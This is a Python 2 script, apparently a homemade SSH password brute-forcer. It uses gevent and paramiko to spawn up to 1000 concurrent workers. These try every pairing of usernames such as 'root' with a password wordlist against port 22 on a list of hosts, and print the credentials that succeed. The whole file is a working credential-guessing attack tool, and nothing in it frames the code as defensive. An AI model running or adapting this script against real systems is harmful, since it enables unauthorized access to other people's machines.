#!/usr/bin/env python
# encoding: utf-8
u'''
进度管理
分布式
'''

from gevent import monkey
monkey.patch_socket()
monkey.patch_thread(threading=True, _threading_local=True, Event=True)

import paramiko
from paramiko.ssh_exception import SSHException
from gevent.pool import Pool
from gevent.queue import Queue, Empty
from gevent import sleep
import random
import time
gl_pool = Pool(1000)
gl_right = set()


def guess_task(host, port, queue):
    addr = (host, port)
    user = ''
    pwd = ''
    while True:
        try:
            t1 = paramiko.Transport(addr)
            t1.start_client()
            user, pwd = queue.get_nowait()
            if (host, user) in gl_right:
                # print 'Ignore %s, %s, %s' % (host, user, pwd)
                continue
            t1.auth_password(user, pwd)
            # here successful
            # queue.queue.clear()
            gl_right.add((host, user))
            print '%s, %s, %s' % (host, user, pwd)
            return user, pwd
        except paramiko.AuthenticationException as e:
            continue
        except SSHException as e:
            # print 'SSHException %s' % e.message
            sleep(5)
            if user and pwd and (host, user) not in gl_right:
                queue.put_nowait((user, pwd))
                continue
        except Empty as _unused:
            # print 'Task Over'
            return None
        except Exception as e:
            sleep(5)
            print '---------unknown error, reconnect, %r' % e


def guess_host(host, port, users, pwds):
    # 先排列组合[(user, pwd), ], 再随机打乱
    ts = []
    guess_count_per_conn = 3
    for user in users:
        for pwd in pwds:
            ts.append((user, pwd))
    random.shuffle(ts)
    conn_count = len(ts) / guess_count_per_conn
    if len(ts) % 3:
        conn_count += 1
    queue = Queue()
    [queue.put(el) for el in ts]
    for _ in range(conn_count):
        gl_pool.spawn(guess_task, host, port, queue)


def guess_transport(transport, username, pwd):
    pass


def batch_guess(ips, users, pwds):
    port = 22
    for host in ips:
        gl_pool.spawn(guess_host, host, port, users, pwds)


def main():
    # ips = ['192.168.0.191', '192.168.0.192', '192.168.0.193']
    ips = ['192.168.2.108', '192.168.2.109', ]
    users = ['root', 'sunday', ]
    # 字典要去重
    with open('pwdlist.txt', 'rt') as f1:
        pwds = f1.readlines()
        pwds = [el.strip() for el in pwds]
    batch_guess(ips, users, pwds)

    gl_pool.join()


if __name__ == '__main__':
    begin = time.time()
    main()
    end = time.time()
    print end - begin
